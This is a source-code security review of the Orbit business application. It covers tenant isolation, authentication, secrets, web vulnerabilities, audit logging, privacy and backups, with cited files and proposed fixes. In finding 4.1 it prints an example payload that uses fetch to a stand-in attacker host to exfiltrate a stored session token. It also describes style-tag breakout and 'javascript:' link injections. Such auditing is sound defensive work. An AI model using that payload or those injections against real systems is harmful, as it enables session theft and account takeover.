# Orbit security review

Scope: the Orbit repository as it stands at commit `1928e97`, migrations up to `195`.
Question asked: would a large company's IT and audit people accept this.
Method: source review only. No code was changed, no SQL was run, no live system was probed.
Everything below cites a file and a line. Where something could not be confirmed from source, it says so.

**Note on work in progress.** The working tree also holds four uncommitted, not-yet-applied migration files: `196-company-ip-rules.sql`, `200-ledger-by-source-app.sql`, `201-own-records.sql` and `202-ledger-source-cutlist.sql` (there is no 197, 198 or 199). They are outside the scope above and are not counted as fixes anywhere in this document, but two of them touch findings here and are noted where they do: 196 adds per-company and per-user IP rules inside the membership check, and 201 makes the "Own records" level real in the database for tables that record an owner. Neither closes finding 1.1 on its own.

---

## 1. One page for the owner

### What is genuinely solid

Orbit is in much better shape than most products at this stage. These are not marketing lines, they are things the code actually does:

* **Every table has row level security switched on, and the test suite proves it.** `tests/live-audit.sh:229` asserts zero tables in the public schema without RLS. It also asserts that every full-rights database function pins its search path, and that no access rule is unconditionally true.
* **Tenant separation has been attacked on purpose and fixed.** `tests/live-audit.sh` creates two throwaway tenants plus a limited member and a sales representative, then runs 73 probes trying to break out. Migrations 168, 173, 174 and 175 exist because earlier probes found real holes.
* **No master key in the code.** Nothing in the repository or in any Cloudflare function uses the Supabase `service_role` key. Every server function uses the public key plus the caller's own session, or a database function that checks permission itself.
* **API keys are hashed, not stored.** `supabase/api-and-webhooks.sql:28` keeps only a SHA-256 of a key.
* **Privacy work is real.** Export and erase exist, are scoped to one company, and are tested across tenants (`tests/live-audit.sh:279`). Visitor IP addresses are wiped after 90 days (`supabase/159-privacy.sql:215`).
* **Output escaping is disciplined.** One helper (`js/app.js:368`), only three inline `onclick` attributes in the whole 34,000 line app, and the spreadsheet formula engine whitelists characters before evaluating (`js/app.js:26976`).

### What blocks an enterprise sale today

These are not bugs. They are things a large customer's security questionnaire asks for and Orbit cannot answer yes to.

1. **No single sign-on (SAML or OIDC) and no multi-factor authentication.** For most companies above about 200 staff this is a hard stop before any technical review begins.
2. **No non-production environment.** One database, one deploy target. Migrations are run by hand against the live system, and a push to `main` is a production release. An auditor will ask how a change is tested and rolled back, and there is no answer.
3. **No point-in-time recovery on the database.** `supabase/161-backups.sql:4` records that the hosting platform reported zero restorable backups and PITR off. The customer-held zip is a good idea but it is a manual button, not a recovery objective.
4. **The audit trail covers four tables.** `supabase/38-depth.sql:60`. No sign-in, no role change, no export, no settings change is recorded anywhere.
5. **No DPA, no sub-processor list, no data residency choice.** One region, one project. A UK or EU buyer cannot sign.

### What is urgent, in the code, today

Two findings are exploitable now by someone who already has a low-privileged login in a customer's own tenant:

* **A role's read permissions are not enforced by the database.** Only salary tables have a read rule tied to the role (`supabase/191-role-write-gates.sql:329-341`). Every other table is readable by any active member of the company, whatever their role says. A junior sales role with "None" for Accounting can read the general ledger, bank statements and staff bank account numbers straight from the API. See finding 1.1 and 1.2.
* **Stored data can run JavaScript in another user's browser.** The payroll formula field is evaluated with `new Function` and no character whitelist (`js/app.js:19953`). Someone with Employees access can store a formula that steals the owner's session when the owner opens a payslip. See finding 4.1.

Neither is a cross-tenant break. Both are inside-the-company privilege escalation, which is exactly what a large customer's access review is designed to catch.

---

## 2. Findings

Severity is the usual four. "Exploitable today" means a person with an ordinary login can do it now. "Gap" means the code is not wrong, it just does not do something an enterprise buyer will require.

### Area 1: Tenant isolation and authorization

#### 1.1 Role read permissions are not enforced by the database

**Severity: High. Exploitable today.**

Migration 191 added restrictive policies so that inserting, updating and deleting a row needs the right level in the right app. It added them for INSERT, UPDATE and DELETE only. The only restrictive SELECT policies in the entire schema are four, all for salaries:

* `supabase/191-role-write-gates.sql:329-341` (`hr_contracts`, `hr_payslips`, `hr_payslip_lines`, `hr_payslip_runs`)

Every other table's read rule is company scope and nothing else, for example:

* `supabase/02-operations.sql:340` (generated for a long list of tables): `for select using (company_id in (select public.my_company_ids()))`
* `supabase/07-bank.sql:36` and `:40` (`bank_statements`, `bank_statement_lines`)

`my_company_ids()` (`supabase/190-roles-enforced.sql:169`) returns every company the person is a member of, subject to the `company_ids` limit. It knows nothing about roles.

So a member of a company whose role says Accounting = None can still issue `GET /rest/v1/journal_entries`, `GET /rest/v1/bank_statements`, `GET /rest/v1/accounts`, `GET /rest/v1/hr_employees` and get every row. The role screen shows them nothing; the API returns everything.

The live audit does not catch this because its sales-representative probes only test writes and admin functions (`tests/live-audit.sh:203-217`).

**Fix.** Generate restrictive SELECT policies the same way 191 generates the write gates: one `as restrictive for select to authenticated using (public.can_read_app(<company expr>, '{apps}'))` per table, with a `can_read_app` helper that accepts View, Own, Work or Manage. Treat "Own records" as a row filter on the owner column where one exists. Add read probes for the sales representative to `tests/live-audit.sh`.

**Partly addressed in the working tree, not applied.** The uncommitted `supabase/201-own-records.sql` adds restrictive SELECT, UPDATE and DELETE policies that make the **Own records** level real in the database, using a new `my_own_only(app)` helper (`:15-34`). That is the right pattern and it closes the "Own records was a screen filter" half of the problem. It does not close this finding, because a role set to **None** or **View** for an app is not "own only" and so is not filtered by those policies at all. The generated `can_read_app` gate above is still needed.

#### 1.2 The money switches are cosmetic

**Severity: High. Exploitable today.**

The role editor offers three switches: costs and margins, salaries, bank and cash (`js/app.js:13129-13130`). Only salaries is real. Costs and bank are applied in the browser only:

* `js/app.js:369` the `money()` helper returns dots when the role cannot see money
* `js/app.js:2244-2247` `roleSees`, `canSeeMoney`, `canSeeBank` read the role object in the browser

The underlying numbers arrive over the API in full. The role editor's own help text is honest about salaries ("the database does not return them") and silent about the rest.

The same applies to staff bank details. `hr_employees` carries `bank_account` (`supabase/08-hr-payroll.sql:15`), `iban` and `bank_name` (`supabase/109-wps-fields.sql:8-10`), and has no restrictive read policy at all. Every member of the company can read every colleague's IBAN.

**Fix.** Same mechanism as 1.1. Add a restrictive read policy on `hr_employees` gated on `can_see(company_id, 'salaries')` for the pay and bank columns, or split those columns into a child table with its own policy. Then correct the role editor's wording.

#### 1.3 `backup_schema_sql()` has no caller check

**Severity: Medium. Exploitable today.**

`supabase/163-backup-schema.sql:19-24` defines the function with `security definer` and no permission check of any kind, and `:163` grants it to `authenticated`. The sweep in `supabase/173-backup-build-authorisation.sql:73-80` matched it by the `backup_` prefix and re-granted it to `authenticated`.

Any signed-in user of any tenant can call it and receive the complete public schema: every table and column, every constraint and index, the full source of every function including the SECURITY DEFINER ones, every trigger, and every row level security policy verbatim.

That is not customer data. It is the entire authorization model handed to an attacker, plus any business logic or identifier embedded in a function body. Migration 155c, for example, contains a hard-coded company id in a function-adjacent script; a reviewer will assume similar things exist in live function bodies.

**Fix.** Give it the same gate `backup_build` now has. It is only ever called from the Backups screen for the active company (`js/app.js:15898`), so it should take a company id and check `public.can_manage_app(p_company, '{settings}')`.

#### 1.4 The vendor can read every tenant, silently

**Severity: Medium. Gap versus enterprise expectations.**

`public.platform_admins` grants a Space Work operator full visibility. `my_orgs()` and `my_company_ids()` both expand to "every org" and "every company" for a platform admin (`supabase/33-platform-admin.sql:46-56`, reaffirmed at `supabase/190-roles-enforced.sql:169-170`). `is_org_admin` and `is_org_writer` do the same (`supabase/168-company-scope.sql:32-50`).

The table itself is well protected: `tests/live-audit.sh:234` asserts no write policy exists on it, and `:174-175` proves a tenant cannot read it or add themselves.

What is missing is everything a customer asks about support access: no record of who holds it, no expiry, no per-incident approval, no logging of what an operator looked at, no notification to the customer.

**Fix.** Add `expires_at` and `reason` to `platform_admins`, require both, and log every query made while platform access is active into a dedicated table the tenant can read. This is the single cheapest item that turns "trust us" into an answer.

#### 1.5 Restrictive gates are scoped to `authenticated` only

**Severity: Medium. Not exploitable today.**

Every restrictive policy 191 creates ends `to authenticated` (`supabase/191-role-write-gates.sql:353-366`). A restrictive policy limited to one role does not restrict any other role. Today the anonymous role has no permissive write policy on those tables, so nothing gets through. But the pattern means that the day somebody adds a public-facing write policy to one of those 280 tables, the entire role model stops applying to it and nothing fails loudly.

**Fix.** Drop `to authenticated` from the restrictive gates so they apply to every role, and let the permissive policies decide who gets in at all.

#### 1.6 Attachments are gated by organisation, and an orphan file is visible to the whole organisation

**Severity: Medium. Exploitable today under a specific condition.**

Storage policies check that the first path segment is one of the caller's orgs, then call `media_visible()`:

* `supabase/168-company-scope.sql:121-130` (read, update, delete)
* `supabase/168-company-scope.sql:83-88` (`media_visible`)

`media_visible` returns true when there is **no** `media` row for that path. So the default is allow. A file uploaded before its `media` row is written, or whose `media` row was deleted, or whose `media.company_id` is null, is readable by every member of the organisation, including a member deliberately limited to one company.

The upload path is also chosen by the browser (`js/app.js:16055`, `S.company.org_id + "/" + entity + ...`) and the insert policy from `supabase/47-media.sql:26` only checks the first segment, so any member can write anywhere inside their org's prefix.

**Fix.** Invert `media_visible` to deny by default: require a matching `media` row whose company is in `my_company_ids()`. Add a periodic job that reports orphaned objects.

#### 1.7 Public endpoints have no bot protection or rate limit

**Severity: Low to Medium. Exploitable today.**

These accept anonymous calls with no captcha, no rate limit and no size cap:

* `site_form_submit` (`supabase/188-website-privacy-settings-fixes.sql:66-83`). The host is supplied by the caller, so anyone can post to any tenant's contact form directly, not only through the rendered page.
* `job_apply` (`supabase/188:97`)
* `event_register`, `public_book_appointment` (`supabase/184-appoint-public-active-services.sql:40`)

Consequence is spam, database growth and noise in a customer's inbox, not data loss.

**Fix.** Put hCaptcha on the public forms, cap the JSON payload size inside the function, and add a per-IP rate limit at Cloudflare.

#### 1.8 The calendar feed token never expires and the response is cached at the edge

**Severity: Medium. Gap.**

`functions/api/calendar/[token].js` treats the token in the URL as the whole authorisation, which is correct for a calendar subscription. The database side is careful: `supabase/193-calendar-feed-own-appointments.sql:12-32` checks the feed is active and that the owner is still an active, unexpired member with that company in scope, and the feed only carries that person's own appointments.

Two things remain. The token has no expiry, and the ICS response is returned with `Cache-Control: public, max-age=900` (`functions/api/calendar/[token].js:79`). The body contains client or patient names. A per-token URL means the cache is not shared, but "public" on a response containing personal data will be questioned in any review.

**Fix.** Change the header to `private, max-age=900` or `no-store`, add an expiry and a visible "rotate this link" action, and show the owner when the feed was last fetched and from where.

#### 1.9 Done well

* Tokenised approve-by-email links: 32 random bytes, only a SHA-256 hash stored, expiry checked (`supabase/118-approve-from-email.sql:74-104`).
* The scheduled-job endpoints verify their shared secret **inside Postgres**, never in the edge function (`functions/api/run-reminders.js:27-35`, `supabase/57-events-reminders.sql:88-91`). The secret is 24 random bytes, so guessing is not practical.
* Migration 175 is a proper sweep: 102 full-rights functions reviewed, and the ones that mattered (forged signed webhooks, sample-data wipes of any company, posting without a session) were closed.

### Area 2: Authentication and session

#### 2.1 No SSO and no MFA

**Severity: High. Gap. This is the single biggest commercial blocker.**

There is no SAML, OIDC or SCIM anywhere in the repository, and nothing calls Supabase's MFA API. The only sign-in path is `sb.auth.signInWithPassword` at `js/app.js:2431`.

A large customer expects: log in with the corporate identity provider, accounts created and removed automatically when someone joins or leaves, and MFA enforced by policy. Orbit offers none of it. Offboarding today means a human remembering to suspend a member.

**Fix, in order of value.** (a) Enable Supabase MFA (TOTP) and add enrol, challenge and an org-level "require MFA" flag. (b) Add OIDC through Supabase Auth's third-party providers, per organisation. (c) SCIM last, it is the largest job and the least often blocking.

#### 2.2 Password policy is enforced in the browser only

**Severity: Medium.**

`js/app.js:2419` and `js/app.js:2456` refuse fewer than 8 characters. That is a UI check. The real minimum is whatever the Supabase project is configured with, which is not in this repository and cannot be confirmed from source. There is no complexity rule, no breached-password check, no expiry and no history.

**Confirm by** reading the Auth settings of project `hlkwzbkgkwywomuvilwe` (Authentication, Policies).

**Fix.** Set the server-side minimum to at least 10 and turn on the leaked-password check in Supabase Auth, then keep the browser check as a courtesy.

#### 2.3 No session lifetime, no revocation, no device list

**Severity: Medium. Gap.**

`js/app.js:13-19` stores the session in `localStorage` by default ("Keep me signed in" is on unless the user turns it off) with `autoRefreshToken: true`. There is no idle timeout, no absolute session lifetime, no screen listing active sessions, and no "sign out of all devices". Suspending a member stops new reads (the RLS helpers check `status` and `expires_at`, `supabase/190-roles-enforced.sql:174-177`) but does not invalidate the refresh token, so the effect is not instant.

**Fix.** Shorten the JWT lifetime in Supabase Auth, add an idle timeout in the app, add a "sign out everywhere" that calls `auth.signOut({scope:'global'})`, and call it automatically when an admin suspends or removes a member.

#### 2.4 No lockout, and brute-force protection is hCaptcha alone

**Severity: Medium.**

hCaptcha is required on sign-in, sign-up and password reset (`js/app.js:2405-2431`), which is a reasonable first line. There is no account lockout, no alert on repeated failures, and nothing in the audit log records a failed sign-in at all (see 5.1).

**Fix.** Turn on Supabase Auth rate limits, and record sign-in successes and failures somewhere a customer can read.

#### 2.5 Sign-up is open to anyone

**Severity: Low. By design, worth stating.**

`js/app.js:2431` will create an account for any email address. That account lands with no organisation. Joining a tenant requires an invitation matched by email. Worth documenting for a customer who asks "who can create an account in our system".

### Area 3: Secrets and keys

#### 3.1 Done well

* No `service_role` key exists anywhere in the repository. A full-text search across every file returns only the placeholder in `tests/README.md:112`. Every Cloudflare function uses the publishable key plus either the caller's JWT or a definer RPC that checks permission itself. This is the correct architecture and it removes the largest single blast radius a Supabase app usually has.
* `config.js` contains only the publishable key and the hCaptcha site key, both of which are meant to be public.
* API keys: only a SHA-256 hash is stored, the plaintext is returned once (`supabase/api-and-webhooks.sql:70-80`), and the `api_keys` table's own RLS denies direct client reads.
* Since migration 194, reading API keys and webhook secrets needs Manage in Settings, and `tests/live-audit.sh:211-212` proves a sales representative is refused.

#### 3.2 No rotation, anywhere

**Severity: Medium. Gap.**

* `app_secrets.reminder_cron_secret` is created once and never rotated (`supabase/57-events-reminders.sql:83-85`). Nothing in the app can change it.
* Webhook signing secrets are stored in plaintext (unavoidable for HMAC) with no rotate action; the only option is delete and recreate (`supabase/api-and-webhooks.sql:178-205`).
* `RESEND_API_KEY`, `CF_API_TOKEN`, `CF_ZONE_ID` and `INVITE_FROM` live in Cloudflare Pages environment variables with no documented owner, no rotation date and no inventory in the repository.

**Fix.** Write a one-page key inventory into this repository: what each key is, where it lives, who holds it, what it can do, when it was last rotated. Add a rotate action for the cron secret and for webhook secrets. An auditor will ask for this document before asking anything else.

#### 3.3 The migration credential is the real master key

**Severity: Medium. Gap.**

Migrations are applied with a Supabase Management API personal access token held on one machine. That token can read, alter or drop everything in the project, and it sits outside any of the controls above. `tests/live-audit.sh` also uses it, and reveals both project API keys with it (`tests/live-audit.sh:51`).

**Fix.** Move migrations to a CI job with the token as a repository secret, scoped and rotated on a schedule, so that every schema change is recorded in a pipeline run rather than a laptop.

### Area 4: Web application security

#### 4.1 Stored data is executed as JavaScript in the payroll engine

**Severity: High. Exploitable today.**

```
js/app.js:19953  function evalFormula(expr, vars) {
js/app.js:19954    try { var keys = Object.keys(vars); return Number(new Function(keys.join(","), "with(Math){return (" + (expr || "0") + ");}")...
```

`expr` is the `formula` column of `hr_salary_heads`, ordinary tenant data. Migration 191 lets anyone with Manage in Employees write that table (`supabase/191-role-write-gates.sql:113`). The function runs whenever a payslip is computed, in the browser of whoever opens it, which in practice is the owner or the accountant.

A formula of the form `fetch('https://attacker/', {method:'POST', body: localStorage.getItem('sb-hlkwzbkgkwywomuvilwe-auth-token')})` exfiltrates the viewer's full session. That session is a company owner's. This is a clean privilege escalation from Employees-Manage to owner.

The fix already exists elsewhere in the same file. The spreadsheet engine resolves cell references, then refuses anything that is not arithmetic before evaluating:

```
js/app.js:26976    if (!/^[-+*\/().,0-9eE\s]*$/.test(e)) return 0;
js/app.js:26977    try { var v = Function('"use strict";return (' + (e.trim() || "0") + ')')(); ...
```

**Fix.** Substitute the variable values into the expression first, then apply exactly that whitelist, then evaluate. Nothing about the payroll feature needs more than arithmetic and the handful of Math functions the sheet engine already supports.

#### 4.2 No security headers at all

**Severity: High. Exploitable today (clickjacking).**

`_headers` sets `Cache-Control` and nothing else. `index.html` has no `<meta http-equiv="Content-Security-Policy">`. Cloudflare Pages adds none by default. So Orbit ships with:

* no Content-Security-Policy, so an injected script anywhere runs with no restriction on where it can send data
* no `frame-ancestors` or `X-Frame-Options`, so orbit.spacework.ai can be framed by any site and clickjacked
* no `Strict-Transport-Security`
* no `X-Content-Type-Options: nosniff`
* no `Referrer-Policy`
* no `Permissions-Policy`

This is the first thing an enterprise scanner reports, and the report is public-facing evidence of immaturity even where the underlying risk is modest.

**Fix.** Add to `_headers`:

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net https://js.hcaptcha.com https://*.hcaptcha.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: blob: https://hlkwzbkgkwywomuvilwe.supabase.co; connect-src 'self' https://hlkwzbkgkwywomuvilwe.supabase.co https://*.hcaptcha.com; frame-src https://*.hcaptcha.com; frame-ancestors 'none'; base-uri 'none'; object-src 'none'
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(self), camera=(self), microphone=()
```

Note that `index.html:22` writes the stylesheet tag with `document.write`, and several print windows are built with `document.write` (`js/app.js:9596`, `10451`, `31624`, `32296`, `32685`, `32948`, `32985`, `33137`). Those are same-origin `about:blank` windows and are compatible with the policy above, but test the print screens after adding CSP.

#### 4.3 A third-party script sits in the authentication path with no integrity check

**Severity: Medium. Gap.**

```
index.html:20  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
```

A floating major version, from a public CDN, with no `integrity` attribute and no `crossorigin`. Whatever jsDelivr serves tomorrow runs with full access to every session token in the app. hCaptcha's script is injected the same way (`js/app.js:2356`).

**Fix.** Pin an exact version, add a subresource integrity hash, or better, vendor `supabase-js` into `js/` and serve it from the same origin. That also makes the CSP tighter and removes an availability dependency.

#### 4.4 Tenants can put arbitrary HTML and CSS on a `spacework.ai` subdomain

**Severity: Medium. Exploitable today by a tenant, against itself and its own visitors.**

The published-site renderer passes two things through unfiltered:

* `functions/site/render-core.js:17` `const raw = (s) => String(s == null ? "" : s);` described as "owner-authored HTML, passed through like a Webflow embed"
* `functions/site/render-core.js:152` the `embed` block, and `:153` the `html` alias, both call `raw(p.html)`
* `functions/site/render-core.js:186-190` `themeCss` interpolates `theme.primary`, `theme.bg`, `theme.ink` and `theme.font` straight into a `<style>` element with no escaping. A value containing `</style><script>` breaks out of the style element and executes.

This is a deliberate product feature (paste an embed code), and the attacker and the victim are the same tenant. The reason it still matters: the resulting script runs on `*.sites.spacework.ai` and on customer custom domains served by the same Worker, which are siblings of `orbit.spacework.ai` under one registrable domain. A `spacework.ai` cookie, a future shared subdomain, or a `document.domain` assumption anywhere turns a tenant's own embed into a cross-tenant problem.

**Fix.** Validate the theme values (hex colour, a font name from an allowlist) before they reach `themeCss`. Serve published sites from a separate registrable domain, not a `spacework.ai` subdomain, so tenant HTML can never be same-site with the ERP. Restrict the embed block to a list of known providers, or sanitise it, and put a strict CSP on rendered pages.

#### 4.5 The public API is fully open to cross-origin browsers, with no rate limit

**Severity: Medium.**

`functions/api/v1/[[path]].js:12-17` sets `Access-Control-Allow-Origin: *` with `Authorization` allowed. That is normal for an API-key API and there are no cookies involved, so it is not a CSRF problem. What it does mean is that anyone can run key-guessing from a browser, and nothing anywhere in the repository implements a rate limit or returns 429.

**Fix.** Add a Cloudflare rate-limiting rule on `/api/v1/*` keyed on the Authorization header and the IP, and reject unknown keys with a small deliberate delay.

#### 4.6 Any signed-in user can send an email to any address from a verified spacework.ai domain

**Severity: Medium. Exploitable today.**

`functions/api/send-invoice.js` accepts `body.to` (`:55`), `body.subject` (`:64`) and a 2,000 character `body.note` (`:63`), builds an HTML message (`:91`) and sends it through Resend from `INVOICE_FROM`, by default `invoices@spacework.ai` (`:62`). The only check is that the caller has a valid session and can read the referenced invoice.

So a trial user can send convincing invoice emails, with their own text, to any recipient, from a domain with valid SPF and DKIM. There is no rate limit and no record of what was sent.

**Fix.** Restrict the recipient to the invoice's own partner email or an address on file, cap the number of sends per company per hour, log every send, and set an envelope sender per tenant so reputation damage is contained.

#### 4.7 Identifiers are interpolated into PostgREST query strings

**Severity: Low.**

* `functions/api/send-invoice.js:45` `"/rest/v1/invoices?id=eq." + invId + "&select=..."`
* `functions/api/send-invoice.js:52` the same for `invoice_lines`
* `functions/api/send-invite.js:46` the same for `org_invites`

`invId` is taken straight from the request body with no `encodeURIComponent`, so a caller can inject extra PostgREST parameters (a different `select`, an `or` filter, a different `limit`). Row level security still applies with the caller's own token, so the result cannot cross a tenant boundary. It is a hygiene defect, not a data leak, but it is exactly the pattern a code review flags.

**Fix.** Wrap every interpolated value in `encodeURIComponent`, and validate that the id is a UUID before using it.

#### 4.8 Upload content type comes from the browser

**Severity: Low.**

`js/app.js:9490` sets `contentType: isImg ? "image/jpeg" : (file.type || "application/octet-stream")`. A crafted request can store an HTML file with `text/html`, and a later signed URL will serve it as HTML from the Supabase storage origin.

That origin is `hlkwzbkgkwywomuvilwe.supabase.co`, which is a different origin from the app, so it cannot read the app's session storage. The practical risk is that Orbit becomes a place to host a phishing page behind a signed URL.

**Fix.** Allowlist the extensions and types you accept, and force `Content-Disposition: attachment` for anything that is not an image or a PDF.

#### 4.9 The careers widget renders a tenant URL into an `href` with no scheme check

**Severity: Low.**

`functions/embed/[[path]].js:40` builds `'<a class=swx-btn href="' + esc(j.apply_url) + '">'`. The escape helper handles `&<>"` but not the URL scheme, so a stored `javascript:` value executes when a visitor clicks Apply. The widget is designed to be dropped onto the tenant's own external website, so the script runs on the tenant's site, not on Orbit.

**Fix.** Refuse anything that is not `http:` or `https:` before rendering.

#### 4.10 Server-side fetch of tenant-supplied URLs (SSRF)

**Severity: Low to Medium. Not confirmed exploitable.**

Two places fetch a URL a tenant controls:

* `supabase/api-and-webhooks.sql:215` `net.http_post(url := w.url, ...)`. `webhook_create` (`:178-186`) stores the URL with no validation at all: no scheme check, no address check. This runs from inside the database's own network. Migration 175 correctly removed the ability for an anonymous caller to trigger it, and since 194 creating a webhook needs Manage in Settings, so the attacker must be a company administrator.
* `functions/api/calendar-pull.js:105-113` requires `https://` but then fetches with `redirect: "follow"`, so a public HTTPS address can redirect to somewhere else.

Whether either actually reaches anything internal depends on the network Supabase `pg_net` and Cloudflare Workers sit on, which cannot be determined from source.

**Fix.** Validate the URL on create: HTTPS only, resolve the host, refuse private and link-local ranges, refuse your own infrastructure hostnames. For `calendar-pull`, set `redirect: "manual"` and re-validate any redirect target.

#### 4.11 No open redirect found

The app reads only two URL parameters, `scan` (`js/app.js:9603`) and `evinvite` (`js/app.js:11355`), and neither is used as a navigation target. The approve-by-email link is built server side from the request origin (`functions/api/send-approval.js:69`).

#### 4.12 Output escaping is done well

Worth stating plainly, because it is the area most apps of this size fail.

* One escaping helper, used consistently (`js/app.js:368`). It escapes `& < > "`. Attribute values are double-quoted throughout, so the missing single-quote escape does not open a hole in the places checked.
* Three inline `onclick` attributes in the whole file. Everything else uses `data-` attributes with delegated listeners.
* The knowledge-base renderer escapes first, then applies markup, and only allows `http(s)` links (`js/app.js:13825-13831`).
* The website renderer escapes every block field except the two deliberate raw ones covered in 4.4.
* The email builders in `functions/api/*.js` escape every interpolated value.

### Area 5: Auditability

#### 5.1 The audit log covers four tables

**Severity: High. Gap.**

```
supabase/38-depth.sql:60   foreach t in array array['invoices','payments','projects','purchase_orders'] loop
```

Nothing else is audited. In particular there is no record of: sign-in or sign-out, failed sign-in, a role being changed, a member being added, suspended or removed, a company's settings being changed, a backup being taken (only that it was, in `backups`), an export being run, an API key being created or revoked, a webhook being pointed somewhere new, or any read of any record.

For an audit team this is the finding that ends the conversation, because it means "who looked at this customer's data" and "who gave this person access" cannot be answered at all.

#### 5.2 The log records that something changed, not what

**Severity: Medium.**

`supabase/38-depth.sql:29-37` stores company, table name, row id, action, actor and time. `supabase/39-audit-email-tenants.sql:7` adds the actor's email. There is no before-and-after value, no IP address, no user agent, no request id. So the log can say "someone changed invoice X at 14:02" and nothing more.

#### 5.3 The log cannot be altered by a tenant

**Severity: none. This part is correct.**

`audit_log` has RLS enabled with a single SELECT policy and no insert, update or delete policy (`supabase/38-depth.sql:39-41`). Only the definer trigger writes it. Migrations 190 and 191 did not add write gates to it, so it stays read-only through the API.

The caveat is that anyone holding the `service_role` key or the Management token can rewrite it freely, and there is no hash chain or external copy to detect that.

#### 5.4 No retention, no export, and the audit trail is excluded from the customer backup

**Severity: Medium.**

`supabase/161-backups.sql:95` and `:111` explicitly exclude `audit_log` (and `visits`) from the table plan. So the zip a customer downloads contains every business record and none of the history of who touched them. There is also no retention rule, no archival, and no way to export the log for an external SIEM.

**Fix for 5.1 to 5.4, as one piece of work.** Extend `audit_row` to the tables that matter (`org_members`, `roles`, `companies`, `journal_entries`, `payments`, `api_keys`, `webhook_endpoints`, `backup_settings`, `hr_*`), store a jsonb diff, and add an `audit_events` table written by the app for sign-in, sign-out, export, backup and platform-admin access. Then decide whether the log belongs in the backup (it probably does) and give it a retention period.

#### 5.5 Platform-admin activity is not logged

Covered in 1.4. Repeated here because an audit team will ask it as an audit question, not an access question.

### Area 6: Data protection

#### 6.1 Encryption

**In transit:** fine. Cloudflare and Supabase are HTTPS only, and customer custom hostnames are registered with `min_tls_version: "1.2"` (`functions/site-domain/[[path]].js:68`).

**At rest:** whatever the Supabase plan provides, which is disk-level encryption. There is no application-level or column-level encryption anywhere, so salaries, IBANs, national identifiers and customer contact details are plaintext to anyone with database access. That is normal for this class of product, but it must be stated rather than implied.

#### 6.2 GDPR export and erase are real and tested

**This is done well.**

* `gdpr_export` and `gdpr_erase` (`supabase/159-privacy.sql:77` and `:142`, extended in `supabase/188-website-privacy-settings-fixes.sql:168` and `:247`) walk a discovered map of every table with an email column, rather than a hand-written list.
* They are scoped to one company, and migration 174 exists specifically because they were not. `tests/live-audit.sh:279-292` proves that exporting a person in tenant A does not return the same person's record in tenant B, and that erasing in A leaves B untouched.
* Erasure keeps the books and says why: the `privacy_requests` note cites Article 17(3)(b) (`supabase/188:315`).
* Every privacy request is recorded with subject, actor, time and row count (`supabase/159-privacy.sql:26-40`).

#### 6.3 Erasure does not reach attachments

**Severity: Medium. Exploitable as a compliance failure, not a security one.**

`gdpr_erase` updates columns in `public` tables only (`supabase/188:277-312`). Nothing touches `public.media` or the storage bucket. A person's photograph, CV, identity document or signed contract scan survives an erasure request intact, and the `media` row still names the entity it belonged to.

**Fix.** Extend `gdpr_erase` to list `media` rows for the subject, delete the storage objects, and record the count in `privacy_requests.rows_touched`.

#### 6.4 IP retention is handled

`analytics_prune` nulls the IP, latitude, longitude, city and network after 90 days and keeps only the country (`supabase/159-privacy.sql:215-228`). The reasoning is written into the migration. Good.

#### 6.5 No residency choice, no DPA, no sub-processor list

**Severity: Medium to High. Gap. Commercial blocker for UK and EU buyers.**

There is one Supabase project (`config.js:3`) in one region. There is no EU-only deployment option, no documented list of sub-processors (Supabase, Cloudflare, Resend, hCaptcha, jsDelivr, Google Fonts are all in the data path), no Data Processing Agreement, and no record of where backups end up (they end up on whichever laptop pressed the button, which is itself a transfer nobody has assessed).

Note that Google Fonts is loaded from `fonts.googleapis.com` on every page load (`index.html:18`), which German regulators have specifically ruled on. Self-hosting the fonts removes that question entirely.

**Fix.** Write the sub-processor list and a DPA. Self-host the fonts. Decide and document what a customer's backup zip is allowed to be stored on.

#### 6.6 No general retention or deletion schedule

Only IP addresses (90 days) and the backup log (last 60 entries, `supabase/162-backup-zip.sql:58-60`) have a retention rule. Business records, attachments, notifications and form submissions are kept forever.

### Area 7: Availability and operations

#### 7.1 Backups: the customer's copy is good, the platform's is missing

**Severity: High. Gap.**

`supabase/161-backups.sql:4-6` records the finding that made this work urgent: the hosting platform reported zero restorable backups and point-in-time recovery off. Whether that is still true cannot be determined from source.

Migration 162 then made a deliberate decision: no server-side copy at all. The backup is a zip built in the browser and saved to the operator's own machine, and Orbit keeps only a log entry (`supabase/162-backup-zip.sql:1-22`). The reasoning is sound and unusually honest, and the zip is genuinely complete: data, attachments, the whole schema as SQL, and a copy of the app itself.

But as a recovery strategy for an enterprise it is not sufficient. There is no automatic copy, no recovery point objective, no recovery time objective, and if nobody presses the button for three weeks then three weeks of work has no copy anywhere. The in-app nudge (`supabase/162-backup-zip.sql:212-240`) is the honest mitigation, not a solution.

**Fix.** Turn on PITR on the Supabase project (confirm its current state first). Keep the customer zip as the portability and escape-hatch story, which is a genuine selling point, and stop presenting it as the disaster recovery story.

#### 7.2 There is no non-production environment

**Severity: High. Gap.**

One Supabase project is referenced anywhere in the repository (`config.js:3`, and the same URL hard-coded as a fallback in every Cloudflare function). Migrations are applied by hand to production. `SETUP.md` describes a Cloudflare Pages project where a push to `main` deploys. `.github/workflows/ci.yml` runs only structural checks that never touch a database; its own comment says it "can never touch production", which is true of the test but not of the deploy that follows it.

There is no staging project, no migration runner, no down migration and no documented rollback. Migration numbering also has a gap: `181` is followed by `184`, with no `182` or `183` in the folder, which means the numbering alone does not prove what has been applied.

**Fix, in order.** (a) Create a staging Supabase project and a staging Pages project. (b) Run every migration there first, from a CI job, and record the result. (c) Add a `schema_migrations` table so the database itself knows which files have been applied. (d) Write the rollback procedure for a bad deploy (Pages keeps every build, so the app side is one click; the database side is the part that needs thought).

#### 7.3 No monitoring, no error reporting, no alerting

**Severity: Medium. Gap.**

A full search for `Sentry`, `console.error` reporting, rate limiting or 429 handling returns nothing across `js/app.js`, `functions/`, `worker/` and the migrations. Errors are shown to the user as a toast and then lost. There is no uptime check, no alert when the nightly `pg_cron` jobs fail, and no dashboard.

The one exception is genuinely good: `.github/workflows/money.yml` runs `tests/behaviour.sh` daily against the live database and fails if a money invariant breaks. That is a better idea than most monitoring, but it only covers the ledger.

